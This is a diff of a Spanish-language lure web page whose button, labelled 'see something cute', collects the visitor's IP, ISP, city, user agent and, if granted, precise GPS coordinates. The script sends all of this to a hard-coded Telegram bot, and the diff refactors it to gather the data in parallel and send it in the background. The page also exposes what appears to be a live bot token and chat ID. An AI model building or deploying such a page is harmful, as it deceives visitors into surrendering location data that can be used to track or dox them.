@@ -2,15 +2,28 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Page</title>
   <style>
-    body { font-family: Arial; padding: 20px; background: #f0f0f0; }
-    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    body {
+      font-family: Arial;
+      padding: 20px;
+      background: #f0f0f0;
+      margin: 0;
+    }
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 100%;
+      box-sizing: border-box;
+    }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Haz click en el boton y rechaza la ubicacion</h2>
+    <h2>Haz click en el botón y rechaza la ubicación</h2>
     <button onclick="collectAndSend()">ver algo lindo</button>
     <pre id="result">..</pre>
   </div>
@@ -19,63 +32,72 @@
     const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
     const CHAT_ID = "6065284869";
 
-    async function getIPInfo() {
-      const res = await fetch("https://ipapi.co/json/");
-      return await res.json();
+    function getIPInfo() {
+      return fetch("https://ipapi.co/json/").then(res => res.json());
     }
 
-    async function sendToTelegram(message) {
+    function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      await fetch(url, {
+      return fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-        }),
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
       });
     }
 
     async function collectAndSend() {
-      document.getElementById("result").textContent = "Espera...";
+      document.getElementById("result").textContent = "Recopilando información...";
 
-      const ipInfo = await getIPInfo();
+      // Inicia ambas tareas al mismo tiempo
+      const ipPromise = getIPInfo();
+      const geoPromise = new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+        } else {
+          reject("Geolocation not supported");
+        }
+      });
 
-      // Send base info immediately
-      const baseMessage = `
-New Visitor Info (without precise location):
-IP: ${ipInfo.ip}
-ISP: ${ipInfo.org}
-City: ${ipInfo.city}
-Region: ${ipInfo.region}
-Country: ${ipInfo.country_name}
+      const [ipResult, geoResult] = await Promise.allSettled([ipPromise, geoPromise]);
+
+      let message = "";
+
+      // Procesar IP
+      if (ipResult.status === "fulfilled") {
+        const ip = ipResult.value;
+        message += `
+IP: ${ip.ip}
+ISP: ${ip.org}
+City: ${ip.city}
+Region: ${ip.region}
+Country: ${ip.country_name}`;
+      } else {
+        message += "No se pudo obtener información IP.\n";
+      }
+
+      // Info general
+      message += `
 User-Agent: ${navigator.userAgent}
 Time: ${new Date().toLocaleString()}
-      `;
-      document.getElementById("result").textContent = baseMessage;
-      await sendToTelegram(baseMessage);
+`;
 
-      // Try to get precise location, but don't block or send if denied
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const locationMessage = `
-Updated Visitor Location:
-Latitude: ${position.coords.latitude}
-Longitude: ${position.coords.longitude}
-Accuracy: ${position.coords.accuracy} meters
-Time: ${new Date().toLocaleString()}
-            `;
-            document.getElementById("result").textContent += "\n" + locationMessage;
-            await sendToTelegram(locationMessage);
-          },
-          (error) => {
-            // User denied or error: do nothing or log silently
-            console.log("Geolocation permission denied or error.");
-          }
-        );
+      // Mostrar primero en pantalla
+      document.getElementById("result").textContent = message;
+      sendToTelegram(message); // No esperar, enviar en segundo plano
+
+      // Procesar ubicación (si se permitió)
+      if (geoResult.status === "fulfilled") {
+        const pos = geoResult.value.coords;
+        const locMsg = `
+Ubicación:
+Lat: ${pos.latitude}
+Lon: ${pos.longitude}
+Precisión: ${pos.accuracy}m
+        `.trim();
+        document.getElementById("result").textContent += "\n\n" + locMsg;
+        sendToTelegram(locMsg);
       } else {
-        console.log("Geolocation not supported by browser.");
+        console.log("Ubicación no otorgada o falló.");
       }
     }
   </script>
